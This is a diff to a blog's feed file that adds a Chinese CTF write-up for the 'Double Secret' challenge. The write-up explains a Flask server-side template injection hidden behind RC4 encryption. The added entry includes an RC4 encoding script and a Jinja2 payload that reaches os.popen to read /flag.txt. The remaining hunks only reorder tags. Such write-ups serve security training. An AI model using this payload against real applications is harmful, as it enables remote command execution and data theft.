@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>[CISCN2019 华东南赛区]Double Secret</title>
+      <link href="/2020/07/24/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/"/>
+      <url>/2020/07/24/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p>国赛国赛，考的一个没听说过的RC4加密算法，只要能把加密算法做出来就是很简单的题目了</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>打开题啥也没有抓包啥也没有就一句Welcome To Find Secret，直接猜get提交一个secret或者路由secret好吧（我是不是也开始成为赛棍了）<br>路由secret有效，给一句Tell me your secret.I will encrypt it so others can’t see，在get提交一个secret，给出了加密的奇奇怪怪的字符串<br>测试测试，乱输的时候出现了报错，用的flask，直接展示了部分源码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#解密</span>    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>    <span class="token keyword">return</span> a</code></pre><p>render_template_string，非常危险的函数好吧，safe应该是自己写的过滤，然后顺便检查了一下有没有带出flag，rc4百度了半天也没看见python的实现库，估计是出题人自己写的，HereIsTreasure应该是密钥，然后对输入的secret进行解密，然后用解密出来的结果进行ssti，顺便考虑一下绕过safe函数</p><p>算法研究实在太难，抄了大佬的脚本，事实上也可以去找在线加密网站，最后再自己base64解码再url编码也行</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token string">"init_key"</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 返回加密后得内容</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> str<span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> ord<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">"HereIsTreasure"</span>  <span class="token comment" spellcheck="true"># 密钥</span>message <span class="token operator">=</span> <span class="token string">"{{{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()[::-1]}}"</span>    <span class="token comment" spellcheck="true"># 明文</span>enc_base64 <span class="token operator">=</span> rc4_main<span class="token punctuation">(</span>key<span class="token punctuation">,</span> message<span class="token punctuation">)</span>enc_init <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_base64<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>enc_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc_init<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rc4加密后的url编码:"</span> <span class="token operator">+</span> enc_url<span class="token punctuation">)</span></code></pre><p>那个safe函数好像什么用也没有，只会输出xxx is not allowed，但是事实上该执行的命令还是会执行，buu上的环境问题flag的格式是flag{xxx}，所以最后那层的过滤就没有用了，不过想绕过也不难，分段读取或者翻转字符串什么的都可行</p><h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><p>真的算坑吗，学艺不精导致的智障操作，payload没有用双大括号括起来，渲染出来就是自己的payload，想了半天怎么回事。。。渲染起码先来一个双大括号吧</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 刷题记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ssti </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[NPUCTF2020]ezinclude</title>
       <link href="/2020/07/21/%5BNPUCTF2020%5Dezinclude/"/>
       <url>/2020/07/21/%5BNPUCTF2020%5Dezinclude/</url>
@@ -278,9 +303,9 @@
       
         <tags>
             
-            <tag> SQLI </tag>
-            
             <tag> wp </tag>
+            
+            <tag> SQLI </tag>
             
         </tags>
       
@@ -332,9 +357,9 @@
       
         <tags>
             
-            <tag> wp </tag>
-            
             <tag> JavaScript </tag>
+            
+            <tag> wp </tag>
             
             <tag> 沙盒逃逸 </tag>
             
@@ -440,9 +465,9 @@
       
         <tags>
             
-            <tag> wp </tag>
-            
             <tag> ssti </tag>
+            
+            <tag> wp </tag>
             
         </tags>
       
@@ -577,9 +602,9 @@
       
         <tags>
             
-            <tag> SQLI </tag>
-            
             <tag> wp </tag>
+            
+            <tag> SQLI </tag>
             
             <tag> phar </tag>
             
@@ -745,9 +770,9 @@
       
         <tags>
             
-            <tag> SQLI </tag>
-            
             <tag> wp </tag>
+            
+            <tag> SQLI </tag>
             
         </tags>
       
